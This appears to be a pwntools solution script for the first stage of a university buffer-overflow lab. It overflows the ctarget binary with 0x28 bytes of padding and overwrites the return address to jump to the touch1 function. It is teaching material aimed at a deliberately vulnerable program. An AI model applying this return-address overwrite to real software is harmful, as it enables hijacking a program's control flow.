from pwn import *

def set_p64(addr):
    return p64(addr).decode("iso-8859-1")

cookie = 0x59b997fa
touch1 = 0x4017c0
touch2 = 0x4017ec
touch3 = 0x4018fa

ctarget = ["./ctarget", "-q"]

# touch 1
p = process(ctarget)

junk = "a" * 0x28

payload = junk + set_p64(touch1)

p.sendline(payload)
print(str(p.recv(), "ascii"))

